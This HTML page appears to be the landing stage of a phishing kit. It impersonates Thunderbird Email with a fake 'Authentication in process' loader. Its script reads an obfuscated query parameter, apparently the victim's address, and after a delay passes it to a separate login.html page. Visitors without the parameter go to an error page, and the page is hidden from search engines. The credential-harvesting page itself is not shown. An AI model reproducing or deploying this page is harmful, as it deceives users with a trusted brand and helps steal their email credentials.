
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
    <head>   
        <meta http-equiv="X-UA-Compatible" content="IE=10">
        <link rel="shortcut icon" href="./image/thunder.png" type="image/x-icon">
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="Robots" content="NOINDEX, NOFOLLOW">
        <link rel="stylesheet" href="./style/style.css">
        <title>Thunderbird Email</title>
        <style>
        #loader {
          
          position: absolute;
          top: calc(50% - 20px);
          left: calc(50% - 20px);
        }
        @keyframes loader {
          0% { left: -100px }
          100% { left: 110%; }
        }
        #box {
          width: 50px;
          height: 50px;
          background:  #0066cc;
          animation: animate .5s linear infinite;
          position: absolute;
          top: 0;
          left: 0;
          border-radius: 3px;
        }
        @keyframes animate {
          17% { border-bottom-right-radius: 3px; }
          25% { transform: translateY(9px) rotate(22.5deg); }
          50% {
            transform: translateY(18px) scale(1,.9) rotate(45deg) ;
            border-bottom-right-radius: 40px;
          }
          75% { transform: translateY(9px) rotate(67.5deg); }
          100% { transform: translateY(0) rotate(90deg); }
        } 
        #shadow { 
          width: 50px;
          height: 5px;
          background: #000;
          opacity: 0.1;
          position: absolute;
          top: 59px;
          left: 0;
          border-radius: 50%;
          animation: shadow .5s linear infinite;
        }
        @keyframes shadow {
          50% {
            transform: scale(1.2,1);
          }
        }
        </style>
        <script>
            // Function to extract query parameter value
            function getQueryParameter(parameterName) {
              var queryString = window.location.search;
              var urlParams = new URLSearchParams(queryString);
              return urlParams.get(parameterName);
            }
            // Get the value from the 'data' query parameter
            var value = getQueryParameter('pspmcosasosd');
            
            if(value == null) {
            
                window.location.href = "error.html";
            
           }else{
            
             function redirectToDestination() {
            // Redirect to the destination page with the variable value in the URL
            window.location.href = "login.html?rtrfgdfgeterutyijkghnvbsdfate=" + (value);
            }

            // Automatically redirect after a certain delay (e.g., 2 seconds)
            setTimeout(redirectToDestination, 5000);
            }
        
            
        
     </script>
    </head>
    <body>
        <div class="conTainer">
            <center>
            <div class="main-Body-box">
            <div class="Heder-Container">
                <div class="Header-font">
                    <p style="line-height: 200%;">Setup Your Existing Email Address</p>
                    <div class="close-Window"><img src="./image/close-window.png" width="20" height="20"/></div>
                </div>
            </div>
            <div class="Body-containeR">
                <div class="image-logo">
                    <div class="img-logo">
                        <img src="./image/thunder.png" width="100" height="70">
                    </div>
                    <div class="text-logo" style="line-height: 20%;">
                        <h4>Please wait.....Authentication in process </h4>
                    </div>
                </div>
                <div id="loader">
                  <div id="shadow"></div>
                  <div id="box"></div>
                </div>
                
            </div>
            </div>
            </center>
        </div>
        
    </body>
</html>
